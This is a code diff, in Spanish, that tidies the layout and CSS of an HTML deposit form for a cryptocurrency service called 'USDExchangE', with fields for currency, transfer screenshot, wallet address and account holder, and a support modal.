@@ -18,14 +18,14 @@
             overflow-x: hidden; /* Evita el desbordamiento horizontal */
         }
 
-        .titulo {
-      font-family: 'Arial', sans-serif;
-      font-size: 48px;
-      font-weight: bold;
-      text-transform: uppercase;
-      position: center;
-      margin-bottom: 20px;
-    }
+       .titulo {
+            font-family: 'Arial', sans-serif;
+            font-size: 48px; 
+            font-weight: bold;
+            text-transform: uppercase;
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
     .titulo .mayusculas {
       color: #FFD700;
@@ -160,17 +160,17 @@
 
 </head>
 <body>
-    <div class="titulo" style="font-family: 'Arial', sans-serif; font-size: 48px; font-weight: bold; text-transform: uppercase; position: relative; margin-bottom: 20px;">
-      <span class="mayusculas" style="color: #FFD700;">USD</span><span class="minusculas" style="color: #00FFFF;">ExchangE</span>
-  <div class="container">
-        <h1>Depósito de Saldo</h1>
-        <p style="font-size: 18px;">Complete el siguiente formulario para cargar saldo a su cuenta. Seleccione la moneda de su depósito.</p>
+    <div class="container">
+        <div class="titulo">
+            <span class="mayusculas">USD</span><span class="minusculas">ExchangE</span>
+        </div>
+        <h1 style="text-align: center;">Depósito de Saldo</h1>
+        <p style="font-size: 18px; text-align: center;">Complete el siguiente formulario para cargar saldo a su cuenta. Seleccione la moneda de su depósito.</p>
 
         <div class="input-group">
             <label for="moneda">Moneda:</label>
             <select id="moneda" onchange="actualizarDatosDeposito()">
                 <option value="USD">Elige moneda</option>
-
                 <option value="USDT">USDT</option>
                 <option value="BTC">BTC</option>
                 <option value="ETH">ETH</option>
@@ -178,13 +178,11 @@
             </select>
         </div>
 
-        <!-- Campos para mostrar la dirección y la red -->
         <div class="input-group" id="infoDeposito" style="display: none;">
             <p><strong>Dirección para el Depósito:</strong> <span id="direccionDeposito"></span></p>
             <p><strong>Red de Envío:</strong> <span id="redEnvio"></span></p>
         </div>
 
-    
         <div class="input-group">
             <label for="captura">Captura del Envío:</label>
             <input type="file" id="captura">
@@ -196,11 +194,9 @@
         </div>
 
         <div class="input-group">
-            <label for="address">Dirección Login Bep20 suya :</label>
+            <label for="address">Dirección Login Bep20 suya:</label>
             <input type="text" id="address">
         </div>
-
-       
 
         <div class="input-group">
             <label for="titular">Nombre del Titular de la Cuenta:</label>
@@ -214,24 +210,22 @@
 
         <button class="btn" onclick="enviarDatos()">Enviar</button>
 
-         <div id="mensaje-exito" class="mensaje" style="background-color: black; z-index: 999; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; border-radius: 10px;">
+        <div id="mensaje-exito" class="mensaje" style="background-color: black; z-index: 999; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; border-radius: 10px;">
             Depósito procesado con éxito. Recibirás un correo electrónico pronto.
             <br>
             <button class="btn" onclick="volverPaginaPrincipal()">Volver a la página principal</button>
         </div>
 
-    <button id="myBtn">SOPORTE</button>
+        <button id="myBtn" class="btn" style="margin-top: 20px;">SOPORTE</button>
 
-<!-- El modal -->
-<div id="myModal" class="modal">
-
-  <!-- Contenido del modal -->
-  <div class="modal-content">
-    <span class="close">&times;</span>
-    <p>Correo: usdeexchange@gmail.com</p>
-    <p>Telegram: @usdexchange_oficial</p>
-  </div>
-      </div>
+        <div id="myModal" class="modal">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+                <p>Correo: usdeexchange@gmail.com</p>
+                <p>Telegram: @usdexchange_oficial</p>
+            </div>
+        </div>
+    </div>
 
 
 
